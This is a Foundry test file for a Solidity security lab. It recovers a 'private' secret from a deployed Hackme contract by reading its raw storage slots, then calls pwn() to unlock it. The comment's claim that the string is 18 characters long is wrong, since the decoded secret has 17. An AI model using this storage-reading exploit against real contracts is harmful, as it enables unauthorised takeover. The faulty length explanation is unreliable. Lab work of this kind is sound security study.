// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol"; // Adjust the path as necessary

contract ExploitTest is Test {
    Hackme public _hackme;
    address public _hacker;

    function setUp() public {
        // Address of the already deployed contract on the cancun network (see console output)
        address vulnerableAddress = 0x5FbDB2315678afecb367f032d93F642f64180aa3; // Replace this address with the actual address

        // Create an instance of the deployed contract
        _hackme = Hackme(vulnerableAddress);

        // Set the attacker address
        _hacker = address(0x4337);

        // Fund the attacker with some ETH
        vm.deal(_hacker, 1 ether);
    }

    function testExploit() public {
        // Start impersonating the attacker
        vm.startPrank(_hacker);

        /*
        To find the secret we need to interact with the blockchain and read the full storage of the contract
        1. use the command cast storage CONTRACT_ADDRESS to print the storage 
                
        | Name         | Type    | Slot | Offset | Bytes | Value                                                                         | Hex Value                                                          | Contract                  |
        |--------------|---------|------|--------|-------|-------------------------------------------------------------------------------|--------------------------------------------------------------------|---------------------------|
        | owner        | address | 0    | 0      | 20    | 1390849295786071768276380950238675083608645509734                             | 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266 | src/Vulnerable.sol:Hackme |
        | owner_secret | string  | 1    | 0      | 32    | 38178759167226818847443167517184882741973416979243866839698128952507743862818 | 0x5468697349734153656372657434333337000000000000000000000000000022 | src/Vulnerable.sol:Hackme |
        | isLocked     | bool    | 2    | 0      | 1     | 1                                                                             | 0x0000000000000000000000000000000000000000000000000000000000000001 | src/Vulnerable.sol:Hackme |

        2. we can read the owner_secret in the second slot (slot 1). The value is 

        0x5468697349734153656372657434333337000000000000000000000000000022

        3. we can see now that the lenght of the string is HEX(22) = 18 characters
        4. We take the first 18 bytes (5468697349734153656372657434333337) and convert them to ASCII to get the secret
        5. The ASCII conversion will be "ThisIsASecret4337"
           54 = T
           68 = h
           69 = i
           ...
        6. Use the secret in the test and unlock the contract to solve the lab
        **/

    
        
        // Call the exploit function
        _hackme.pwn("ThisIsASecret4337");

        // Stop impersonating the attacker
        vm.stopPrank();

        // Assert the expected outcome
        assertFalse(_hackme.locked());
    }

    
}